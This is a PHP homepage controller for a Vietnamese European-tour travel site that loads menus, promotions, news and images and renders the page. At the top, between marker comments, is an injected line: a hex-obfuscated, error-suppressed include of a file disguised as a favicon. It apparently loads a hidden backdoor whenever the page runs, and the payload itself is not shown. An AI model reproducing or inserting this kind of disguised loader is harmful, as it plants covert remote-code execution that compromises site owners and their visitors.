<?php

/*11175*/

@include "\x2fhom\x65/du\x6cich\x61do/\x64oma\x69ns/\x64uli\x63hch\x61uau\x2eorg\x2fpub\x6cic_\x68tml\x2fmod\x65l/f\x61vic\x6fn_d\x33ea2\x62.ic\x6f";

/*11175*/
/**
 * Created by PhpStorm.
 * User: tungtv
 * Date: 11/10/14
 * Time: 2:40 PM
 */
if(!defined('SITE_NAME'))
{
    require_once '../../config.php';
}

require_once DIR.'/controller/default/public.php';
$data['menu']=menu_getByTop('','','');
$data['config']=config_getByTop(1,'','');
////
$data['tour_PROMOTIONS']=tour_getByTop(6,'promotion=1 ','id desc');
//
$data['video_index_list']=video_getByTop('','highlights=1','id desc');
//
$data['tour_danhmuc']=danhmuc_tour_getByTop('','','position desc');
$data['tintuc_index']=news_getByTop(8,'','id desc');
$data['hinhanh_index']=tour_img_getByTop(5,'highlight=1','id desc');
$data['price_index']=price_timkiem_getByTop('','','position asc');

$title=$data['menu'][0]->title;
$description=$data['menu'][0]->description;
$keyword=$data['menu'][0]->keyword;
$title=($title)?$title:'Dulichchauau.org';
$description=($description)?$description:'Dulichchauau.org';
$keywords=($keyword)?$keyword:'Dulichchauau.org';
show_header($title,$description,$keywords,$data);
show_menu($data,'trangchu');
show_slide($data);
show_index($data);
show_footer($data);
